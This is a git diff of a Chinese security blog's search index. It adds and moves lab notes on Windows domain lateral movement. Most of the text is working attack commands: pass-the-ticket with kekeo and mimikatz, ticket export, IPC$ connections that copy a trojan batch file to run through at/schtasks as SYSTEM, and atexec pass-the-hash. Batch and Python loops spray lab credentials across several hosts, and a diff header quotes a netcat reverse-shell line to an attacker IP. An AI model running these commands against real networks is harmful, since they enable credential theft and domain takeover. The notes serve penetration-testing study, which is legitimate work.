+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312002227026.png" alt="image-20220312002227026"></p>
+<p>6.利用</p>
+<pre><code>dir \\主机名\c$
+</code></pre>
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312002420045.png" alt="image-20220312002420045"></p>
+<p>这里是对域控攻击所以net time /domain查主机名</p>
+<h3 id="第二种利用工具kekeo"><a href="#第二种利用工具kekeo" class="headerlink" title="第二种利用工具kekeo"></a>第二种利用工具kekeo</h3><p>1.生成票据</p>
+<pre><code>./kekeo &quot;tgt::ask /user:域成员名 /domain:域名 /ntlm:ntlm值&quot;
+
+./kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695d……&quot;
+</code></pre>
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312003010504.png" alt="image-20220312003010504"></p>
+<p>2.导入票据</p>
+<pre><code>kerberos::ptt 票据文件
+
+kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi
+</code></pre>
+<p><img src="/2022/03/11/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91PTH&PTK&PTT%E5%93%88%E5%B8%8C%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92/image-20220312003037687.png" alt="image-20220312003037687"></p>
+<p>3.查看凭证</p>
+<pre><code>klist
+</code></pre>
+<p>4.利用net use载入</p>
+<pre><code>dir \\192.168.3.21\c$
+</code></pre>
+<h3 id="第三种利用本地票据（需管理权限）"><a href="#第三种利用本地票据（需管理权限）" class="headerlink" title="第三种利用本地票据（需管理权限）"></a>第三种利用本地票据（需管理权限）</h3><p>利用<strong>mimikatz</strong>收集本地票据，再将票据导入到内存中进行连接。有存活时间限制（之前有人用这台被拿下的主机连结过域控，就会存在相关凭据，我们的目的就是导出所有凭据，找到与连结过域控的凭据）</p>
+<pre><code>privilege::debug
+
+sekurlsa::tickets /export
+
+kerberos::ptt 票据文件
+</code></pre>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>ptt传递不需本地管理员权限，连接时主机名连接，基于漏洞、工具、本地票据</p>
+<h2 id="国产Ladon内网杀器测试-信息收集，连接等"><a href="#国产Ladon内网杀器测试-信息收集，连接等" class="headerlink" title="国产Ladon内网杀器测试-信息收集，连接等"></a>国产Ladon内网杀器测试-信息收集，连接等</h2><p>信息收集-协议扫描-漏洞探针-传递攻击等</p>
+<p>“Wiki”界面有命令介绍</p>
+<p>信息收集</p>
+<p>GUI：“scan”界面选“scan”，“OnlinePC”界面右键选“OnlinePC”扫描</p>
+<p>命令行：Ladon [网段] [关键词]</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/bmjoker/p/10355979.html">内网渗透之PTH&amp;PTT&amp;PTK</a></p>
+<p>Kerberos协议工作原理：<a href="https://blog.csdn.net/qq_32005671/article/details/54862678">https://blog.csdn.net/qq_32005671/article/details/54862678</a></p>
+<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>Ladon：<a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p>
+<p>Ladon 9.1.1 &amp; CobaltStrike神龙插件发布：<a href="http://k8gege.org/Ladon/cs911.html">http://k8gege.org/Ladon/cs911.html</a></p>
+<p>kekeo：<a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p>
+<p>WindowsExploits/MS14-068：<a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
 ]]></content>
       <categories>
         <category>内网安全</category>
@@ -2269,6 +2269,94 @@ python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvcSrv-DB-0day.0
       </tags>
   </entry>
   <entry>
+    <title>域横向批量at&amp;schtasks&amp;impacket</title>
+    <url>/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&amp;schtasks&amp;impacket/</url>
+    <content><![CDATA[<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220309210002253.png" alt="image-20220309210002253"></p>
+<h2 id="横向渗透明文传递at-amp-schtasks"><a href="#横向渗透明文传递at-amp-schtasks" class="headerlink" title="横向渗透明文传递at&amp;schtasks"></a>横向渗透明文传递at&amp;schtasks</h2><p>at&amp;schtasks命令，可以在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>获取到某域主机权限-&gt;minikatz得到密码（明文，hash）-&gt;用到信息收集域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典-&gt;尝试连接-&gt;创建计划任务（at|schtasks）-&gt;执行文件可为后门或者相关命令</p>
+<h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><ol>
+<li><strong>建立IPC链接</strong>到目标主机</li>
+<li>拷贝要执行的命令脚本到目标主机</li>
+<li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</li>
+<li>删除IPC链接</li>
+</ol>
+<h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><p>(Inter Process Connection)共享命名管道的资源，是为了实现进程间通信而开放的命名管道。IPC可以通过验证用户名和密码获取相应权限，通常在远程管理计算机和查看计算机的共享资源时使用</p>
+<p>通过ipc$可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器只能够的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息</p>
+<h3 id="IPC相关操作"><a href="#IPC相关操作" class="headerlink" title="IPC相关操作"></a>IPC相关操作</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 连接工作组内主机</span></span><br><span class="line">net use \\IP\ipc<span class="variable">$</span><span class="string">&quot;密码&quot;</span> /user:用户名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接域内主机</span></span><br><span class="line">net use \\IP\ipc<span class="variable">$</span><span class="string">&quot;密码&quot;</span> /user:域名\用户名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件列表（C盘）</span></span><br><span class="line"><span class="built_in">dir</span> \\IP\C<span class="variable">$</span>\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载文件</span></span><br><span class="line"><span class="built_in">copy</span> \\IP\C<span class="variable">$</span>\<span class="number">1</span>.bat <span class="number">1</span>.bat</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制文件</span></span><br><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.bat \\IP\C<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除IPC</span></span><br><span class="line">net use \\IP\C<span class="variable">$</span>\<span class="number">1</span>.bat /<span class="built_in">del</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看对方共享</span></span><br><span class="line">net view IP</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="建立IPC常见的错误代码"><a href="#建立IPC常见的错误代码" class="headerlink" title="建立IPC常见的错误代码"></a>建立IPC常见的错误代码</h3><p>（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</p>
+<p>（2）51：网络问题，Windows无法找到网络路径</p>
+<p>（3）53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题</p>
+<p>（4）67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$</p>
+<p>（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立ipc$，需要先删除</p>
+<p>（6）1326：账号密码错误</p>
+<p>（7）1792：目标NetLogon服务未启动，连接域控常常会出现此情况</p>
+<p>（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</p>
+<h3 id="建立IPC失败的原因"><a href="#建立IPC失败的原因" class="headerlink" title="建立IPC失败的原因"></a>建立IPC失败的原因</h3><p>（1）目标系统不是NT或以上的操作系统</p>
+<p>（2）对方没有打开ipc$共享</p>
+<p>（3）对方未开启139、445端口，或者被防火墙屏蔽</p>
+<p>（4）输出命令、账号密码有错误</p>
+<h2 id="at-amp-schtasks使用"><a href="#at-amp-schtasks使用" class="headerlink" title="at&amp;schtasks使用"></a>at&amp;schtasks使用</h2><h3 id="版本-lt-win2012-使用at"><a href="#版本-lt-win2012-使用at" class="headerlink" title="版本 &lt; win2012 使用at"></a>版本 &lt; win2012 使用at</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 建立ipc连接</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.21</span>\ipc<span class="variable">$</span> <span class="string">&quot;Admin12345&quot;</span> /user:god.org\administrator</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝执行文件（木马）到目标机器</span></span><br><span class="line"><span class="built_in">copy</span> add.bat \\<span class="number">192.168</span>.<span class="number">3.21</span>\c<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加计划任务</span></span><br><span class="line">at \\<span class="number">192.168</span>.<span class="number">3.21</span> <span class="number">23</span>:<span class="number">50</span> c:\add.bat</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="版本-gt-win2012-使用schtasks"><a href="#版本-gt-win2012-使用schtasks" class="headerlink" title="版本 &gt;= win2012 使用schtasks"></a>版本 &gt;= win2012 使用schtasks</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 建立ipc连接</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.32</span>\ipc<span class="variable">$</span> <span class="string">&quot;admin!@#45&quot;</span> /user:administrator</span><br><span class="line"><span class="comment"># 注意这里如果连接域用户可能会因权限不够导致之后拷贝文件不成功，所以这里连接的是本地administrator</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制文件（木马）到其C盘</span></span><br><span class="line"><span class="built_in">copy</span> add.bat \\<span class="number">192.168</span>.<span class="number">3.32</span>\c<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建adduser任务对应执行文件</span></span><br><span class="line">schtasks /create /s <span class="number">192.168</span>.<span class="number">3.32</span> /ru <span class="string">&quot;SYSTEM&quot;</span> /tn adduser /<span class="built_in">sc</span> DAILY /tr c:\add.bat /F</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行adduser任务</span></span><br><span class="line">schtasks /run /s <span class="number">192.168</span>.<span class="number">3.32</span> /tn adduser /i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除adduser任务</span></span><br><span class="line">schtasks /delete /s <span class="number">192.168</span>.<span class="number">3.21</span> /tn adduser /f</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="横向渗透明文、Hash传递-atexec-来自impacket网络协议工具包"><a href="#横向渗透明文、Hash传递-atexec-来自impacket网络协议工具包" class="headerlink" title="横向渗透明文、Hash传递-atexec(来自impacket网络协议工具包)"></a>横向渗透明文、Hash传递-atexec(来自impacket网络协议工具包)</h2><p>之前的at和schtasks只能传明文，传递密文使用atexec（这个工具还带有提权，whoami返回system），但这个是第三方文件，需要做免杀</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用</span></span><br><span class="line">atexec.exe ./用户名:密码@IP <span class="string">&quot;命令&quot;</span></span><br><span class="line"></span><br><span class="line">atexec.exe 域名/用户名:密码@IP <span class="string">&quot;命令&quot;</span></span><br><span class="line"></span><br><span class="line">atexec.exe <span class="literal">-hashes</span> 密码的hash值 ./用户名@IP <span class="string">&quot;命令&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 例如</span></span><br><span class="line">atexec.exe ./administrator:Admin12345@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line">atexec.exe god/administrator:Admin12345@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line">atexec.exe <span class="literal">-hashes</span> :ccef208c6485269c20db2cad21734fe7 ./administrator@<span class="number">192.168</span>.<span class="number">3.21</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="横向渗透明文、Hash传递批量利用"><a href="#横向渗透明文、Hash传递批量利用" class="headerlink" title="横向渗透明文、Hash传递批量利用"></a>横向渗透明文、Hash传递批量利用</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># win自带命令+net use</span></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (IP.txt) <span class="keyword">do</span> net use \\%%i\ipc<span class="variable">$</span><span class="string">&quot;密码&quot;</span> /user:用户名</span><br><span class="line"></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (ip.txt) <span class="keyword">do</span> net use \\%%i\ipc<span class="variable">$</span> <span class="string">&quot;admin!@#45&quot;</span> /user:administrator</span><br><span class="line"></span><br><span class="line"><span class="comment"># win自带命令+atexec</span></span><br><span class="line"><span class="comment">## 批量检测多IP对应一明文</span></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (IP.txt) <span class="keyword">do</span> atexec.exe ./用户名:密码<span class="selector-tag">@</span>%%i <span class="string">&quot;命令]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (ip.txt) <span class="keyword">do</span> atexec.exe ./administrator:admin!<span class="selector-tag">@</span><span class="comment">#45@%%i whoami</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 批量检测多明文对应一IP</span></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (pass.txt) <span class="keyword">do</span> atexec.exe ./用户名:%%i@IP <span class="string">&quot;命令&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (pass.txt) <span class="keyword">do</span> atexec.exe ./administrator:%%i@<span class="number">192.168</span>.<span class="number">3.21</span> whoami</span><br><span class="line"></span><br><span class="line"><span class="comment">## 批量检测多HASH对应一IP</span></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (hash.txt) <span class="keyword">do</span> atexec.exe <span class="literal">-hashes</span> %%i ./用户名@IP <span class="string">&quot;命令&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">FOR</span> /F %%i <span class="keyword">in</span> (hash.txt) <span class="keyword">do</span> atexec.exe <span class="literal">-hashes</span> %%i ./administrator@<span class="number">192.168</span>.<span class="number">3.21</span> whoami</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击流程（已有一台服务器权限）"><a href="#攻击流程（已有一台服务器权限）" class="headerlink" title="攻击流程（已有一台服务器权限）"></a>攻击流程（已有一台服务器权限）</h3><ol>
+<li><p>使用mimikatz获取密码（明文+密文）</p>
+<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310002315030.png" alt="image-20220310002315030"></p>
+<p>得到密码，并作记录</p>
+<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310002349383.png" alt="image-20220310002349383"></p>
+</li>
+<li><p>用自带命令探针同网段下存活主机</p>
+<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310002735038.png" alt="image-20220310002735038"></p>
+</li>
+<li><p>使用自带语法+atexec，批量检测多ip对应一明文。这里将ip都存放在同一文件内，执行如下bat文件</p>
+<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310003002026.png" alt="image-20220310003002026"></p>
+</li>
+<li><p>执行完后，探针到另一台服务器也有相同密码</p>
+<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310003127002.png" alt="image-20220310003127002"></p>
+</li>
+<li><p> 如法炮制，在新地址上传mimikatz获取新密码，密码字典+1芜湖</p>
+</li>
+</ol>
+<p>   <img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310003404796.png" alt="image-20220310003404796"></p>
+<ol start="6">
+<li><p>再故技重施，用新密码重新完成步骤3的工作，成功得到域控的权限，到此基本结束</p>
+<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220310003652617.png" alt="image-20220310003652617"></p>
+</li>
+</ol>
+<p>注意：真实环境不会这么快这么简单，但思路差不多</p>
+<h2 id="横向渗透明文、Hash传递批量利用-升级版"><a href="#横向渗透明文、Hash传递批量利用-升级版" class="headerlink" title="横向渗透明文、Hash传递批量利用-升级版"></a>横向渗透明文、Hash传递批量利用-升级版</h2><p>考虑到前文的批处理只有一个变量，导致检测效率很低，所以我们选择python来写，将用户名、密码、ip地址都定义为变量提高效率，还可以使用多线程</p>
+<p>利用py脚本制作的exe文件批量尝试横向渗透</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用代码</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">1.安装pyinstaller</span></span><br><span class="line"><span class="string">pip install pyinstaller</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.生成可执行EXE</span></span><br><span class="line"><span class="string">Pyinstaller -F py文件</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3.会生成一个同名的exe文件</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.33&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users=&#123;<span class="comment"># 通过net user /domain收集</span></span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">passs=&#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;admin!@#45&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Admin12345&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> pas <span class="keyword">in</span> passs:</span><br><span class="line">            <span class="built_in">exec</span>=<span class="string">&quot;net use \\&quot;</span>+<span class="string">&quot;\\&quot;</span>+ip+<span class="string">&quot;\ipc$&quot;</span>+pas+<span class="string">&quot;/user:god\\&quot;</span>+user</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span>+<span class="built_in">exec</span>+<span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            os.system(<span class="built_in">exec</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><a href="https://gitee.com/RichChigga/impacket-examples-windows">impacket-examples-windows</a></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>小迪安全</p>
+<p><a href="https://www.sohu.com/a/515863300_99907709">域内横向移动_ipc$_命令_目标</a></p>
+]]></content>
+      <categories>
+        <category>内网安全</category>
+      </categories>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>内网安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>域横向网络&amp;传输&amp;应用层隧道技术</title>
     <url>/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&amp;%E4%BC%A0%E8%BE%93&amp;%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
     <content><![CDATA[<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20220314130404064.png" alt="image-20220314130404064"></p>
@@ -2434,159 +2522,6 @@ nc 攻击机IP 1234 -e c:\windows\system32\cmd.exe
       </tags>
   </entry>
   <entry>
-    <title>域横向批量at&amp;schtasks&amp;impacket</title>
-    <url>/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&amp;schtasks&amp;impacket/</url>
-    <content><![CDATA[<p><img src="/2022/03/09/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&schtasks&impacket/image-20220309210002253.png" alt="image-20220309210002253"></p>
-<h2 id="横向渗透明文传递at-amp-schtasks"><a href="#横向渗透明文传递at-amp-schtasks" class="headerlink" title="横向渗透明文传递at&amp;schtasks"></a>横向渗透明文传递at&amp;schtasks</h2><p>at&amp;schtasks命令，可以在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。</p>
-<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>获取到某域主机权限-&gt;minikatz得到密码（明文，hash）-&gt;用到信息收集域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典-&gt;尝试连接-&gt;创建计划任务（at|schtasks）-&gt;执行文件可为后门或者相关命令</p>
-<h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><ol>
-<li><strong>建立IPC链接</strong>到目标主机</li>
-<li>拷贝要执行的命令脚本到目标主机</li>
-<li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</li>
-<li>删除IPC链接</li>
-</ol>
-<h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><p>(Inter Process Connection)共享命名管道的资源，是为了实现进程间通信而开放的命名管道。IPC可以通过验证用户名和密码获取相应权限，通常在远程管理计算机和查看计算机的共享资源时使用</p>
-<p>通过ipc$可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器只能够的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息</p>
-<h3 id="IPC相关操作"><a href="#IPC相关操作" class="headerlink" title="IPC相关操作"></a>IPC相关操作</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 连接工作组内主机</span></span><br><span class="line">net use \\IP\ipc<span class="variable">$</span><span class="string">&quot;密码&quot;</span> /user:用户名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接域内主机</span></span><br><span class="line">net use \\IP\ipc<span class="variable">$</span><span class="string">&quot;密码&quot;</span> /user:域名\用户名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看文件列表（C盘）</span></span><br><span class="line"><span class="built_in">dir</span> \\IP\C<span class="variable">$</span>\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载文件</span></span><br><span class="line"><span class="built_in">copy</span> \\IP\C<span class="variable">$</span>\<span class="number">1</span>.bat <span class="number">1</span>.bat</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制文件</span></span><br><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.bat \\IP\C<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除IPC</span></span><br><span class="line">net use \\IP\C<span class="variable">$</span>\<span class="number">1</span>.bat /<span class="built_in">del</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看对方共享</span></span><br><span class="line">net view IP</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="建立IPC常见的错误代码"><a href="#建立IPC常见的错误代码" class="headerlink" title="建立IPC常见的错误代码"></a>建立IPC常见的错误代码</h3><p>（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限</p>
-<p>（2）51：网络问题，Windows无法找到网络路径</p>
-<p>（3）53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题</p>
-<p>（4）67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$</p>
-<p>（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立ipc$，需要先删除</p>
-<p>（6）1326：账号密码错误</p>
-<p>（7）1792：目标NetLogon服务未启动，连接域控常常会出现此情况</p>
-<p>（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</p>
-<h3 id="建立IPC失败的原因"><a href="#建立IPC失败的原因" class="headerlink" title="建立IPC失败的原因"></a>建立IPC失败的原因</h3><p>（1）目标系统不是NT或以上的操作系统</p>
-<p>（2）对方没有打开ipc$共享</p>
-<p>（3）对方未开启139、445端口，或者被防火墙屏蔽</p>
-<p>（4）输出命令、账号密码有错误</p>
-<h2 id="at-amp-schtasks使用"><a href="#at-amp-schtasks使用" class="headerlink" title="at&amp;schtasks使用"></a>at&amp;schtasks使用</h2><h3 id="版本-lt-win2012-使用at"><a href="#版本-lt-win2012-使用at" class="headerlink" title="版本 &lt; win2012 使用at"></a>版本 &lt; win2012 使用at</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 建立ipc连接</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.21</span>\ipc<span class="variable">$</span> <span class="string">&quot;Admin12345&quot;</span> /user:god.org\administrator</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝执行文件（木马）到目标机器</span></span><br><span class="line"><span class="built_in">copy</span> add.bat \\<span class="number">192.168</span>.<span class="number">3.21</span>\c<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加计划任务</span></span><br><span class="line">at \\<span class="number">192.168</span>.<span class="number">3.21</span> <span class="number">23</span>:<span class="number">50</span> c:\add.bat</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="版本-gt-win2012-使用schtasks"><a href="#版本-gt-win2012-使用schtasks" class="headerlink" title="版本 &gt;= win2012 使用schtasks"></a>版本 &gt;= win2012 使用schtasks</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 建立ipc连接</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.32</span>\ipc<span class="variable">$</span> <span class="string">&quot;admin!@#45&quot;</span> /user:administrator</span><br><span class="line"><span class="comment"># 注意这里如果连接域用户可能会因权限不够导致之后拷贝文件不成功，所以这里连接的是本地administrator</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制文件（木马）到其C盘</span></span><br><span class="line"><span class="built_in">copy</span> add.bat \\<span class="number">192.168</span>.<span class="number">3.32</span>\c<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建adduser任务对应执行文件</span></span><br><span class="line">schtasks /create /s <span class="number">192.168</span>.<span class="number">3.32</span> /ru <span class="string">&quot;SYSTEM&quot;</span> /tn adduser /<span class="built_in">sc</span> DAILY /tr c:\add.bat /F</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行adduser任务</span></span><br><span class="line">schtasks /run /s <span class="number">192.168</span>.<span class="number">3.32</span> /tn adduser /i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除adduser任务</span></span><br><span class="line">schtasks /delete /s <span class="number">192.168</span>.<span class="number">3.21</span> /tn adduser /f</span><br></pre></td></tr></table></figure>
